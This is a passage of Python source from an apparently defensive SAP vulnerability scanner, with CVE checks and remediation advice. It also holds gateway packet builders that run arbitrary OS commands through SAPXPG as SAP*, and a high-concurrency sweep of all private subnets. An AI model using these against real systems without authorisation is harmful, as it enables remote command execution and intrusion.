                    f = check_cve_2020_6308(inst.ip, port, use_ssl, timeout)
                    if f:
                        inst.findings.append(f)
                    step()

                if cancelled():
                    break

                # -- SAP BusinessObjects-specific checks --
                is_bo = inst.services.get("bo_web") or inst.services.get("bo_cms")
                if is_bo:
                    # Check BO CMC admin console exposure
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        log_verbose("  Checking BO CMC exposure on %s:%d ..." % (inst.ip, port))
                        f = check_bo_cmc_exposed(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                    if cancelled():
                        break

                    # Check CVE-2024-41730 (SSO Token Theft via REST API)
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        log_verbose("  Checking CVE-2024-41730 (BO SSO token) on %s:%d ..." % (inst.ip, port))
                        f = check_cve_2024_41730(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                    if cancelled():
                        break

                    # Check CVE-2025-0061 (Session Hijacking via BI Launch Pad)
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        log_verbose("  Checking CVE-2025-0061 (BO session hijack) on %s:%d ..." % (inst.ip, port))
                        f = check_cve_2025_0061(inst.ip, port, use_ssl, timeout)
                        if f:
                            inst.findings.append(f)
                        step()

                    if cancelled():
                        break

                # Check BO CMS port exposure (CVE-2026-0485 / CVE-2026-0490)
                bo_cms_svc = inst.services.get("bo_cms")
                if bo_cms_svc:
                    cms_port = bo_cms_svc.get("port", 6400)
                    log_verbose("  Checking BO CMS port exposure on %s:%d ..." % (inst.ip, cms_port))
                    f = check_bo_cms_network_exposed(inst.ip, cms_port, timeout)
                    if f:
                        inst.findings.append(f)
                    step()

                    if cancelled():
                        break

                # Check /sap/public/info once (on the first HTTP port that has it)
                # to avoid duplicate info-disclosure findings for the same instance
                info_leak_ports = []
                for port, use_ssl in http_ports:
                    if cancelled():
                        break
                    f = check_icm_info_leak(inst.ip, port, use_ssl, timeout)
                    if f:
                        info_leak_ports.append(port)
                        if len(info_leak_ports) == 1:
                            # Keep the first finding, annotate with all ports later
                            info_leak_finding = f
                    step()

                if info_leak_ports:
                    if len(info_leak_ports) > 1:
                        info_leak_finding.description = (
                            "The /sap/public/info endpoint exposes system information "
                            "on ports %s, including SID, database host, kernel version, "
                            "and OS details." % ", ".join(str(p) for p in info_leak_ports)
                        )
                        info_leak_finding.port = info_leak_ports[0]
                    inst.findings.append(info_leak_finding)

                if cancelled():
                    break

                # SAPControl checks
                sc_svc = inst.services.get("sapcontrol")
                if sc_svc:
                    port = sc_svc["port"]
                    use_ssl = sc_svc.get("ssl", False)

                    print("[*] %s - Checking SAPControl on port %d ..." % (inst_label, port))
                    f = check_sapcontrol_unprotected(inst.ip, port, use_ssl, timeout)
                    if f:
                        inst.findings.append(f)
                    step()

                # DIAG login screen information disclosure
                if inst.services.get("dispatcher") and not cancelled():
                    f = check_diag_login_info_leak(inst)
                    if f:
                        inst.findings.append(f)
                    step()

                # CVE-2022-41272: SAP P4 service unauthenticated access
                p4_ports = _get_instance_p4_ports(inst)
                if p4_ports:
                    print("[*] %s - Checking CVE-2022-41272 (P4) on %d port(s) ..." % (
                        inst_label, len(p4_ports)))
                for p4_port in p4_ports:
                    if cancelled():
                        break
                    log_verbose("  Checking CVE-2022-41272 (P4) on %s:%d ..." % (inst.ip, p4_port))
                    f = check_cve_2022_41272(inst.ip, p4_port, timeout)
                    if f:
                        inst.findings.append(f)
                    step()

                if cancelled():
                    break

                # Cloud Connector port exposure check
                cc_icm = inst.services.get("icm")
                if cc_icm and "cloud connector" in cc_icm.get("server", "").lower():
                    cc_port = cc_icm["port"]
                    log_verbose("  Cloud Connector detected on %s:%d" % (inst.ip, cc_port))
                    inst.findings.append(Finding(
                        name="SAP Cloud Connector Port Exposed",
                        severity=Severity.LOW,
                        description=(
                            "An SAP Cloud Connector administration port (%d) is accessible "
                            "from the scanning host. The Cloud Connector provides a secure "
                            "tunnel between cloud applications and on-premise systems. Its "
                            "administration interface should be restricted to authorized "
                            "administrators only and not be exposed to the wider network."
                            % cc_port
                        ),
                        remediation=(
                            "Restrict access to the Cloud Connector administration port "
                            "(%d) using firewall rules so that only authorized "
                            "administrators can reach it. The port should not be "
                            "accessible from untrusted networks or general user "
                            "segments." % cc_port
                        ),
                        detail="Cloud Connector detected via server header on %s:%d"
                               % (inst.ip, cc_port),
                        port=cc_port,
                    ))
                    step()

                if cancelled():
                    break

                # MDM vulnerability checks (MDS or MDIS)
                mdm_svc = inst.services.get("mdm") or inst.services.get("mdis")
                if mdm_svc and not cancelled():
                    mdm_ver = inst.info.get("mdm_version", "")
                    log_verbose("  Checking CVE-2021-21475 (MDM) on %s ..." % inst.ip)
                    f = check_cve_2021_21475(mdm_ver)
                    if f:
                        inst.findings.append(f)
                    step()

                    log_verbose("  Checking CVE-2021-21482 (MDM) on %s ..." % inst.ip)
                    f = check_cve_2021_21482(mdm_ver)
                    if f:
                        inst.findings.append(f)
                    step()

                if cancelled():
                    break

                # HANA SQL port exposure checks
                for p, desc in sorted(inst.ports.items()):
                    if cancelled():
                        break
                    if "HANA SQL" in desc:
                        log_verbose("  HANA SQL port %d (%s) exposed on %s" % (p, desc, inst.ip))
                        inst.findings.append(Finding(
                            name="HANA SQL Port Exposed (%s)" % desc,
                            severity=Severity.LOW,
                            description=(
                                "The %s port %d is accessible from the scanning host. "
                                "HANA SQL ports (3NN13 for SystemDB, 3NN15 for tenant databases) "
                                "are internal database ports that in many cases should be "
                                "firewalled and only accessible for a specific group of "
                                "users and machines (e.g. application servers, database "
                                "administrators)." % (desc, p)
                            ),
                            remediation=(
                                "Restrict access to HANA SQL port %d using firewall rules "
                                "so that only authorized application servers and DBA "
                                "workstations can reach it. The port should not be "
                                "accessible from untrusted networks or general user "
                                "segments." % p
                            ),
                            detail="TCP port %d (%s) open on %s" % (p, desc, inst.ip),
                            port=p,
                        ))
                        step()

                if cancelled():
                    break

                # SSL/TLS version checks on every HTTPS port
                ssl_checked = set()
                # Collect ports to check: anything with "HTTPS" in description
                ssl_ports_to_check = []
                for p, desc in sorted(inst.ports.items()):
                    if "HTTPS" in desc:
                        ssl_ports_to_check.append(p)
                # Also check every service detected as SSL during fingerprinting
                for svc in inst.services.values():
                    if isinstance(svc, dict) and svc.get("ssl") and svc.get("port"):
                        if svc["port"] not in ssl_ports_to_check:
                            ssl_ports_to_check.append(svc["port"])

                # Build a set of ports known to require SSL (from "Illegal SSL request" detection)
                ssl_required_ports = set()
                icm_svc = inst.services.get("icm")
                if icm_svc and icm_svc.get("ssl_required"):
                    ssl_required_ports.add(icm_svc["port"])

                if ssl_ports_to_check:
                    print("[*] %s - Checking SSL/TLS on %d port(s) ..." % (
                        inst_label, len(ssl_ports_to_check)))

                for p in sorted(ssl_ports_to_check):
                    if cancelled():
                        break
                    if p not in ssl_checked:
                        ssl_checked.add(p)
                        log_verbose("  Checking SSL/TLS on %s:%d ..." % (inst.ip, p))
                        f = check_weak_ssl(inst.ip, p, timeout,
                                           ssl_required=(p in ssl_required_ports))
                        if f:
                            inst.findings.append(f)
                        step()

                if cancelled():
                    break

                # ICM URL scan (opt-in via --url-scan)
                if url_scan and http_ports:
                    for port, use_ssl in http_ports:
                        if cancelled():
                            break
                        _print = prog.console.print if has_progress else print
                        _print("[*] URL scanning %s:%d (%s) - %d paths ..." % (
                            inst.ip, port, sys_obj.sid, ICM_PATH_COUNT))
                        url_results, server_hdr, url_prefixes = scan_icm_urls(
                            inst.ip, port, use_ssl, timeout, url_scan_threads, verbose,
                            progress_callback=lambda: step(),
                            cancel_check=cancel_check)
                        if url_results:
                            inst.url_scan_results.extend([
                                dict(r, scan_port=port, scan_ssl=use_ssl) for r in url_results
                            ])
                            # Count interesting results
                            accessible = [r for r in url_results if r["status_code"] == 200]
                            auth_required = [r for r in url_results if r["status_code"] == 401]
                            forbidden = [r for r in url_results if r["status_code"] == 403]
                            verb_tampered = [r for r in url_results if r.get("verb_tamper")]
                            redirects = [r for r in url_results
                                         if r["status_code"] in (301, 302, 303, 307, 308)]
                            _print("[+]   %s:%d - %d accessible, %d auth required, "
                                  "%d forbidden, %d redirects, %d verb tamper bypass" % (
                                      inst.ip, port, len(accessible), len(auth_required),
                                      len(forbidden), len(redirects), len(verb_tampered)))
                        if server_hdr:
                            inst.info["icm_server_header"] = server_hdr
                        if url_prefixes:
                            inst.info["icm_url_prefixes"] = ", ".join(url_prefixes)

                        # Create finding if verb tampering bypass found
                        verb_tampered = [r for r in url_results if r.get("verb_tamper")]
                        if verb_tampered:
                            paths_str = ", ".join(r["path"] for r in verb_tampered[:5])
                            if len(verb_tampered) > 5:
                                paths_str += " (and %d more)" % (len(verb_tampered) - 5)
                            inst.findings.append(Finding(
                                name="ICM HTTP Verb Tampering Bypass",
                                severity=Severity.MEDIUM,
                                description="HTTP verb tampering bypass detected: HEAD request "
                                            "returns 200 while GET returns 401 on %d path(s)." % len(verb_tampered),
                                remediation="Review ICM handler authorization configuration. "
                                            "Ensure all HTTP methods are properly authenticated.",
                                detail="Affected paths: %s" % paths_str,
                                port=port,
                            ))

                        # Create finding if /sap/admin/public/index.html is accessible
                        for r in url_results:
                            if r["path"] == "/sap/admin/public/index.html" and r["status_code"] == 200:
                                inst.findings.append(Finding(
                                    name="SAP Admin Public Page Accessible",
                                    severity=Severity.MEDIUM,
                                    description="The SAP ICM administration public page "
                                                "/sap/admin/public/index.html is accessible without "
                                                "authentication, exposing internal system information.",
                                    remediation="Restrict access to /sap/admin/* paths via ICM "
                                                "ACLs or disable the admin handler entirely.",
                                    detail="URL: %s://%s:%d/sap/admin/public/index.html (HTTP 200, %d bytes)" % (
                                        "https" if use_ssl else "http", inst.ip, port, r["content_length"]),
                                    port=port,
                                ))
                                break

    if not has_progress and _vuln_done[0] > 0:
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()

    return landscape


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 9: Gateway SAPXPG Packet Builders
# ═══════════════════════════════════════════════════════════════════════════════

def build_tlv(tag_bytes, value):
    """Build a CPIC TLV: 4-byte tag + 2-byte big-endian length + value."""
    if isinstance(value, str):
        value = value.encode("ascii")
    if isinstance(tag_bytes, str):
        tag_bytes = tag_bytes.encode("latin-1")
    return tag_bytes + struct.pack("!H", len(value)) + value


def build_gw_p1(target_ip, instance):
    """Build GW_NORMAL_CLIENT registration packet (64 bytes)."""
    service = "sapgw%s" % instance
    tp = "sapgw%s" % instance

    p = b""
    p += struct.pack("B", 0x02)
    p += struct.pack("B", 0x03)
    p += ip_to_bytes(target_ip)
    p += b"\x00" * 4
    p += pad_right(service, 10, b" ")
    p += b"4103"
    p += b"\x00" * 6
    p += pad_right_null("sapserve", 8)
    p += pad_right(tp, 8, b" ")
    p += b" " * 8
    p += struct.pack("B", 0x06)
    p += struct.pack("B", 0x0B)
    p += struct.pack("!h", -1)
    p += struct.pack("!I", 0)
    p += struct.pack("B", 0)
    p += struct.pack("B", 0)

    return p


def build_saprfc_header_v6(func_type, gw_id=0xFFFF, uid=19, err_len=0,
                           info2=0x01, trace_level=0, time_val=0,
                           info3=0xC0, timeout=-1, info4=0, seq_no=0,
                           sap_param_len=0, padd_appc=0,
                           info=0x00C9, vector=0, appc_rc=0, sap_rc=0,
                           conv_id=None):
    """Build 48-byte SAPRFC v6 header."""
    if conv_id is None:
        conv_id = b"0" + b"\x00" * 7
    elif isinstance(conv_id, str):
        conv_id = conv_id.encode("ascii")
    conv_id = pad_right_null(conv_id, 8)

    h = b""
    h += struct.pack("B", 0x06)
    h += struct.pack("B", func_type)
    h += struct.pack("B", 0x03)
    h += struct.pack("B", 0x00)
    h += struct.pack("!H", uid)
    h += struct.pack("!H", gw_id)
    h += struct.pack("!H", err_len)
    h += struct.pack("B", info2)
    h += struct.pack("B", trace_level)
    h += struct.pack("!I", time_val)
    h += struct.pack("B", info3)
    h += struct.pack("!i", timeout)
    h += struct.pack("B", info4)
    h += struct.pack("!I", seq_no)
    h += struct.pack("!H", sap_param_len)
    h += struct.pack("B", padd_appc)
    h += struct.pack("!H", info)
    h += struct.pack("B", vector)
    h += struct.pack("!I", appc_rc)
    h += struct.pack("!I", sap_rc)
    h += conv_id[:8]

    return h


def build_saprfcextend(dest_name, ncpic_lu, ncpic_tp, ctype=0x45, client_info=1,
                       comm_idx=0, conn_idx=0xFFFF):
    """Build SAPRFCEXTEND structure (32 bytes)."""
    e = b""
    e += pad_right(dest_name, 8, b" ")
    e += pad_right_null(ncpic_lu, 8)
    e += pad_right(ncpic_tp, 8, b" ")
    e += struct.pack("B", ctype)
    e += struct.pack("B", client_info)
    e += b"\x00\x00"
    e += struct.pack("!H", comm_idx)
    e += struct.pack("!H", conn_idx)

    return e


def build_saprf_dt_struct(target_ip, long_tp="sapxpg"):
    """Build SAPRFCDTStruct (340 bytes)."""
    ipv6_mapped = b"\x00" * 12 + ip_to_bytes(target_ip)

    d = b""
    d += struct.pack("B", 0x60)
    d += b"\x00" * 8
    d += b"\x0E\x02\x00\x00\x00\x00\xE8\x4D\x23\x00\xDF\x07\x00\x00\x01\x00"
    d += b"\x4E\xD5\x81\xE3\x09\xF6\xF1\x18\xA0\x0A\x00\x0C\x29\x00\x99\xD0"
    d += struct.pack("!I", 0)
    d += struct.pack("!i", -1)
    d += struct.pack("!i", -1)
    d += struct.pack("B", 2)
    d += struct.pack("B", 0)
    d += struct.pack("B", 10)
    d += ipv6_mapped
    d += pad_right_null(target_ip, 128)
    d += b"\x00" * 16
    d += pad_right("SAP*", 12, b" ")
    d += b"\x20" * 8
    d += b"\x00" * 4
    d += b"\x20" * 12
    d += b"\x00" * 16
    d += ip_to_bytes(target_ip)
    d += b"\x00" * 4
    d += pad_right_null(long_tp, 64)

    return d


def build_gw_p2(target_ip, dest_name="T_75"):
    """Build F_SAP_INIT packet (452 bytes)."""
    dt = build_saprf_dt_struct(target_ip)

    header = build_saprfc_header_v6(
        func_type=0xCA,
        gw_id=0xFFFF,
        uid=19,
        info2=0x01,
        info3=0xC0,
        timeout=-1,
        sap_param_len=len(dt),
        info=0x0087,
        vector=0,
    )

    ext = build_saprfcextend(
        dest_name=dest_name,
        ncpic_lu="172.16.0",
        ncpic_tp="sapxpg",
        ctype=0x45,
        conn_idx=0xFFFF,
    )

    cm_ok = b"0" + b"\x00" * 31

    return header + ext + cm_ok + dt


def build_sapcpic_suffix(kernel):
    """Build SAPCPICSUFFIX - TLV-encoded suffix block."""
    s = b""
    entries = [
        (b"\x10\x04\x02", b"\x00\x01\x87\x68\x00\x00\x04\x4c\x00\x00\x0b\xb8"),
        (b"\x10\x04\x0b", b"\xff\x7f\xfa\x0d\x78\xb7\x27\xde\xf6\x19\x62\x93\x25\xbf\x15\x93\xef\x73\xfe\xeb\xdb\x51\xed\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
        (b"\x10\x04\x04", b"\x00\x16\x00\x07\x00\x10\x00\x07"),
        (b"\x10\x04\x0d", b"\x00\x00\x00\x27\x00\x00\x01\x0c\x00\x00\x00\x35\x00\x00\x01\x0c"),
        (b"\x10\x04\x16", b"\x00\x11"),
        (b"\x10\x04\x17", b"\x00\x22"),
        (b"\x10\x04\x19", b"\x00\x00"),
        (b"\x10\x04\x1e", b"\x00\x00\x03\x67\x00\x00\x07\x58"),
        (b"\x10\x04\x25", b"\x00\x01"),
        (b"\x10\x04\x09", kernel.encode("ascii")),
        (b"\x10\x04\x1d", b"\x30"),
        (b"\x10\x04\x1f", b"Linux x86_64"),
        (b"\x10\x04\x20", b"sap_scanner"),
        (b"\x10\x04\x21", b"scanner"),
        (b"\x10\x04\x24", b"\x00\x00\x04\x1a\x00\x00\x07\x80"),
        (b"\x10\x04\x13", b"\x02\xe1\xd4\x81\xe3\x0b\x21\xf1\x01\xa0\x0a\x00\x0c\x29\x00\x99\xd0\x01\x37\xd5\x81\xe3\x88\x9a\xf1\x6b\xa0\x0a\x00\x0c\x29\x00\x99\xd0\x00"),
    ]

    for tag, val in entries:
        s += tag + struct.pack("!H", len(val)) + val

    return s


def build_saprfc_th_struct(sid, hostname, instance, target_ip):
    """Build SAPRFCTHStruct (230 bytes)."""
    sysid_str = "%s/%s_%s_%s" % (sid, hostname, sid, instance)

    cpic_param = b""
    cpic_param += b"\x01\x00\x0c\x29"
    cpic_param += b"\x00\x99\xd0\x1e"
    cpic_param += b"\xe3\xa0\xba\x9a\xec\xea\x55\x80\x0a\x4e\xd5"
    cpic_param += b"\x81\xe3"
    cpic_param += b"\x09\xf6\xf1\x18"
    cpic_param += ip_to_bytes("225.0.0.0")
    cpic_param += ip_to_bytes(target_ip)
    cpic_param += struct.pack("!I", 1)

    th = b""
    th += b"*TH*"
    th += struct.pack("B", 3)
    th += struct.pack("!H", 230)
    th += struct.pack("!H", 0)
    th += pad_right(sysid_str, 32, b" ")
    th += struct.pack("!H", 1)
    th += pad_right("SAP*", 32, b" ")
    th += pad_right("SM49", 40, b" ")
    th += pad_right(sysid_str, 32, b" ")
    th += struct.pack("!H", 1)
    th += pad_right_null("37D581E3889AF16DA00A000C290099D0001", 35)
    th += struct.pack("B", 0)
    th += cpic_param
    th += b"\x00\x00\x00\xe2"
    th += b"*TH*"

    return th


def build_saprfxpg(command, params):
    """Build SAPRFXPG structure for SAPXPG_START_XPG_LONG."""
    extprog = pad_right(command, 128, b" ")
    longparam = pad_right(params, 1024, b" ")
    param = pad_right(params, 255, b" ")

    xpg = b""
    xpg += build_tlv(b"\x05\x12\x02\x05", b"CONVID")
    xpg += build_tlv(b"\x02\x05\x02\x05", b"STRTSTAT")
    xpg += build_tlv(b"\x02\x05\x02\x05", b"XPGID")
    xpg += build_tlv(b"\x02\x05\x02\x01", b"EXTPROG")
    xpg += build_tlv(b"\x02\x01\x02\x03", extprog)
    xpg += build_tlv(b"\x02\x03\x02\x01", b"LONG_PARAMS")
    xpg += build_tlv(b"\x02\x01\x02\x03", longparam)
    xpg += build_tlv(b"\x02\x03\x02\x01", b"PARAMS")
    xpg += build_tlv(b"\x02\x01\x02\x03", param)
    xpg += build_tlv(b"\x02\x03\x02\x01", b"STDERRCNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"M")
    xpg += build_tlv(b"\x02\x03\x02\x01", b"STDINCNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"R")
    xpg += build_tlv(b"\x02\x03\x02\x01", b"STDOUTCNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"M")
    xpg += build_tlv(b"\x02\x03\x02\x01", b"TERMCNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"C")
    xpg += build_tlv(b"\x02\x03\x02\x01", b"TRACECNTL")
    xpg += build_tlv(b"\x02\x01\x02\x03", b"6")
    xpg += build_tlv(b"\x02\x03\x03\x01", b"LOG")
    xpg += build_tlv(b"\x03\x01\x03\x30", b"\x00\x00\x00\x01")
    xpg += build_tlv(b"\x03\x30\x03\x02", b"\x00\x00\x00\x80\x00\x00\x00\x00")

    return xpg


def build_sapcpicparam(target_ip, flag=1):
    """Build SAPCPICPARAM (33 bytes)."""
    p = b""
    p += b"\x01\x00\x0c\x29"
    p += b"\x00\x99\xd0\x1e"
    p += b"\xe3\xa0\xba\x9a\xec\xea\x55\x80\x0a\x4e\xd5"
    p += b"\x81\xe3"
    p += b"\x09\xf6\xf1\x18"
    p += ip_to_bytes("225.0.0.0")
    p += ip_to_bytes(target_ip)
    p += struct.pack("!I", flag)
    return p


def build_sapcpicparam2():
    """Build SAPCPICPARAM2 (16 bytes)."""
    p = b""
    p += b"\xe3\x81\xd5\x4e\xf6\x09\x19\xf1"
    p += ip_to_bytes("160.10.0.12")
    p += ip_to_bytes("41.0.153.208")
    return p


def build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params):
    """Build the full SAPCPIC structure for SAPXPG_START_XPG_LONG."""
    host_sid_inbr = "%s_%s_%s" % (hostname, sid, instance)

    th = build_saprfc_th_struct(sid, hostname, instance, target_ip)
    cpic_param_data = build_sapcpicparam(target_ip, flag=1)
    cpic_param2_data = build_sapcpicparam2()
    xpg = build_saprfxpg(command, params)
    suffix = build_sapcpic_suffix(kernel)

    c = b""
    c += b"\x01\x01\x00\x08"
    c += struct.pack("!H", 257)

    c += b"\x01\x01\x01\x01"
    c += struct.pack("!H", 0)

    c += b"\x01\x01\x01\x03"
    c += struct.pack("!H", 4) + b"\x00\x00\x06\x1b"

    c += b"\x01\x03\x01\x06"
    c += struct.pack("!H", 11) + b"\x04\x01\x00\x03\x01\x03\x02\x00\x00\x00\x23"

    c += build_tlv(b"\x01\x06\x00\x07", pad_right(target_ip, 15, b" "))
    c += build_tlv(b"\x00\x07\x00\x18", target_ip.encode("ascii"))
    c += build_tlv(b"\x00\x18\x00\x08", host_sid_inbr.encode("ascii"))
    c += build_tlv(b"\x00\x08\x00\x11", b"3")
    c += build_tlv(b"\x00\x11\x00\x13", (kernel + " ").encode("ascii"))
    c += build_tlv(b"\x00\x13\x00\x12", (kernel + " ").encode("ascii"))
    c += build_tlv(b"\x00\x12\x00\x06", dest.encode("ascii"))
    c += build_tlv(b"\x00\x06\x01\x30", b"SAPLSSXP")
    c += build_tlv(b"\x01\x30\x01\x11", b"SAP*")
    c += build_tlv(b"\x01\x11\x01\x14", client.encode("ascii"))
    c += build_tlv(b"\x01\x14\x01\x15", b"E")
    c += build_tlv(b"\x01\x15\x00\x09", b"SAP*")
    c += build_tlv(b"\x00\x09\x01\x34", client.encode("ascii"))
    c += build_tlv(b"\x01\x34\x05\x01", b"\x01")

    c += b"\x05\x01"
    c += b"\x01\x36"
    c += struct.pack("!H", len(cpic_param_data)) + cpic_param_data

    c += b"\x01\x36\x05\x02"
    c += struct.pack("!H", 0)

    c += build_tlv(b"\x05\x02\x00\x0b", kernel.encode("ascii"))
    c += build_tlv(b"\x00\x0b\x01\x02", b"SAPXPG_START_XPG_LONG")

    c += b"\x01\x02\x05\x03"
    c += struct.pack("!H", 0)

    c += b"\x05\x03\x01\x31"
    c += struct.pack("!H", len(th)) + th

    c += b"\x01\x31\x05\x14"
    c += struct.pack("!H", len(cpic_param2_data)) + cpic_param2_data

    c += build_tlv(b"\x05\x14\x04\x20", b"\x00\x00\x00\x00")
    c += b"\x04\x20\x05\x12"
    c += struct.pack("!H", 0)

    c += xpg

    c += b"\x03\x02\x01\x04"
    c += struct.pack("!H", len(suffix)) + suffix

    c += b"\x01\x04\xff\xff"
    c += struct.pack("!H", 0)

    c += b"\xff\xff\x00\x00"

    return c


def build_gw_p3(conv_id, target_ip, hostname, sid, instance, kernel, dest, client, command, params):
    """Build F_SAP_SEND packet with SAPXPG_START_XPG_LONG."""
    cpic = build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params)

    header = build_saprfc_header_v6(
        func_type=0xCB,
        gw_id=1,
        uid=19,
        info2=0,
        info3=0,
        timeout=500,
        sap_param_len=8,
        info=0x0085,
        vector=0x0C,
        conv_id=conv_id,
    )

    cm_ok = b"\x00" * 31 + b"\x02"

    p = header + cm_ok + cpic
    p += struct.pack("!H", len(cpic))
    p += struct.pack("!I", 28000)

    return p


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 10: Hail Mary - Private Subnet Discovery
# ═══════════════════════════════════════════════════════════════════════════════

# Private IPv4 ranges (RFC 1918), ordered smallest → largest
HAIL_MARY_RANGES = ["192.168.0.0/16", "172.16.0.0/12", "10.0.0.0/8"]

# SAP indicator ports: most reliable signs of an SAP system (instance 00)
HAIL_MARY_PROBE_PORTS = list(range(3200, 3400)) + [50013, 1128, 1129]

# Ports to probe per sample IP during Phase 1 subnet liveness check
HAIL_MARY_PHASE1_PORTS = [3200, 443]

# Sample host offsets to probe per /24 during subnet liveness check
HAIL_MARY_SUBNET_SAMPLES = [1, 2, 5, 10, 21, 29, 50, 80]


def _hail_mary_get_concurrency():
    """Determine safe max async concurrency from OS file descriptor limit."""
    try:
        import resource
        soft, _hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        return max(min(soft - 100, 4000), 200)
    except Exception:
        return 1000


def _hail_mary_raise_fd_limit():
    """Try to raise the soft file descriptor limit for high concurrency."""
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < 4096:
            new_soft = min(hard, 8192)
            resource.setrlimit(resource.RLIMIT_NOFILE, (new_soft, hard))
            return new_soft
        return soft
    except Exception:
        return None


async def _hm_probe_tcp(ip_str, port, timeout):
    """Async TCP connect probe. Returns (ip_str, 'open'|'refused'|'closed')."""
    try:
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(ip_str, port), timeout=timeout)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return (ip_str, "open")
    except ConnectionRefusedError:
        # Host exists, port closed — subnet is live
        return (ip_str, "refused")
    except Exception:
        return (ip_str, "closed")


async def _hm_phase1(range_subnets, timeout, concurrency, progress, task_id, console=None):
    """Phase 1: Probe sample IPs in each /24 to find live subnets.

    Processes each RFC 1918 range separately to prevent the massive 10.0.0.0/8
    range from starving probes to smaller ranges (192.168.0.0/16, 172.16.0.0/12).
    A brief pause between ranges lets the network stack recover.

    For each /24 we probe a spread of IPs on SAP-related ports.
    If ANY probe gets a TCP connection or RST (connection refused),
    the /24 is marked as live.
    """
    live_subnets = set()
    batch_limit = 20000

    for range_str, subnets in range_subnets:
        sem = asyncio.Semaphore(concurrency)
        live_indices = set()

        if console:
            console.print("[cyan]    Scanning %s (%d /24 subnets)...[/cyan]"
                          % (range_str, len(subnets)))

        async def probe(subnet_idx, ip_str, port):
            async with sem:
                result = await _hm_probe_tcp(ip_str, port, timeout)
                if result[1] in ("open", "refused"):
                    if subnet_idx not in live_indices:
                        live_indices.add(subnet_idx)
                        if console:
                            console.print("[green]    Live subnet found: %s[/green]"
                                          % subnets[subnet_idx])
                progress.advance(task_id)

        batch = []
        for idx, subnet in enumerate(subnets):
            base_int = int(subnet.network_address)
            for offset in HAIL_MARY_SUBNET_SAMPLES:
                ip_str = str(ipaddress.IPv4Address(base_int + offset))
                for port in HAIL_MARY_PHASE1_PORTS:
                    batch.append(probe(idx, ip_str, port))
                    if len(batch) >= batch_limit:
                        await asyncio.gather(*batch)
                        batch = []
        if batch:
            await asyncio.gather(*batch)

        for i in live_indices:
            live_subnets.add(subnets[i])

        # Pause between ranges to let the network stack recover
        await asyncio.sleep(2)

    return live_subnets


async def _hm_phase2(live_subnets, timeout, concurrency, progress, task_id):
    """Phase 2: Scan all hosts in live /24s for SAP indicator ports.

    For each live /24, probe every host (.1-.254) on key SAP ports.
    Returns set of IP strings where at least one SAP port was open.
    Uses capped concurrency and a retry pass to handle transient failures.
    """
    # Cap Phase 2 concurrency to avoid flooding the network on a small number
    # of live subnets (all probes firing simultaneously causes packet loss).
    p2_concurrency = min(concurrency, 500)
    sem = asyncio.Semaphore(p2_concurrency)
    sap_hosts = set()

    async def probe(ip_str, port):
        async with sem:
            result = await _hm_probe_tcp(ip_str, port, timeout)
            if result[1] == "open":
                sap_hosts.add(ip_str)
            progress.advance(task_id)

    # Process subnet groups to limit memory (100 subnets x 254 hosts x N ports)
    sorted_subs = sorted(live_subnets, key=lambda s: int(s.network_address))
    group_size = 100
    for gi in range(0, len(sorted_subs), group_size):
        group = sorted_subs[gi:gi + group_size]
        batch = []
        for subnet in group:
            for ip in subnet.hosts():
                ip_str = str(ip)
                if ip_str in sap_hosts:
                    continue  # already found
                for port in HAIL_MARY_PROBE_PORTS:
                    batch.append(probe(ip_str, port))
        if batch:
            await asyncio.gather(*batch)

    return sap_hosts


async def _hm_phase2_retry(live_subnets, timeout, concurrency, found_hosts,
                            progress, task_id):
    """Phase 2 retry: re-probe hosts not yet found with reduced concurrency."""
    retry_concurrency = min(concurrency // 2, 200)
    retry_sem = asyncio.Semaphore(retry_concurrency)
    retry_timeout = max(timeout * 2, 2.0)
    sap_hosts = set(found_hosts)

    async def retry_probe(ip_str, port):
        async with retry_sem:
            result = await _hm_probe_tcp(ip_str, port, retry_timeout)
            if result[1] == "open":
                sap_hosts.add(ip_str)
            progress.advance(task_id)

    sorted_subs = sorted(live_subnets, key=lambda s: int(s.network_address))
    batch = []
    for subnet in sorted_subs:
        for ip in subnet.hosts():
            ip_str = str(ip)
            if ip_str in sap_hosts:
                continue
            for port in HAIL_MARY_PROBE_PORTS:
                batch.append(retry_probe(ip_str, port))
    if batch:
        await asyncio.gather(*batch)

    return sap_hosts


def hail_mary_discover(timeout=0.5, verbose=False):
    """Discover SAP hosts across all RFC 1918 private subnets.

    Uses a two-phase async approach:
      Phase 1 — Subnet sweep: probe 8 sample IPs per /24 on ports 3200
                and 443 to find live subnets (eliminates 99%+ of the space).
                Each RFC 1918 range is processed separately with pauses.
      Phase 2 — Host sweep:   scan all 254 IPs in each live /24 on 203
                SAP ports (3200-3399, 50013, 1128, 1129) to find actual
                SAP systems. Includes a retry pass at reduced concurrency.

    Returns a sorted list of IP strings with open SAP ports.
    """
    from rich.progress import (Progress, SpinnerColumn, BarColumn,
                               TextColumn, TimeElapsedColumn, MofNCompleteColumn)
    from rich.console import Console

    # Try to raise FD limit for high concurrency
    _hail_mary_raise_fd_limit()
    concurrency = _hail_mary_get_concurrency()

    console = Console(stderr=True)
    console.print()
    console.print("[bold red]" + "=" * 62)
    console.print("[bold red]  HAIL MARY — Scanning all RFC 1918 private subnets")
    console.print("[bold red]" + "=" * 62)
    console.print("[white]  Ranges:      192.168.0.0/16  172.16.0.0/12  10.0.0.0/8")
    console.print("[white]  Total:       ~17.9 million IP addresses")
    console.print("[white]  Offsets:     .%s" %
                  ", .".join(str(o) for o in HAIL_MARY_SUBNET_SAMPLES))
